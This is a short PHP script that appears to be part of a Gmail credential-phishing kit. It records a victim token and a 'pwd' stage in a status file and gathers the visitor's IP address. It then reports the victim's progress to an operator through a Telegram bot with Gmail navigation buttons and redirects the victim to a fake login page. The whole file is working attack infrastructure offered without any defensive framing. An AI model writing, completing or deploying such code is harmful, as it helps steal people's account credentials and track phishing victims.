<?php
include "helper.php";
$token=$_POST['token'];

$filePath = "status/" .$token. ".txt";

file_put_contents($filePath, 'pwd');


$ip = getClientIp();

$message="NEW\ncontinue pressed\nid: <code>".$token."</code>\nip: <code>".$ip."</code>";
$keyboard = getGmailNavKeyboard($token);
sendTGWithButtons($message, $keyboard);
header("Location: login.php?token=".$token);
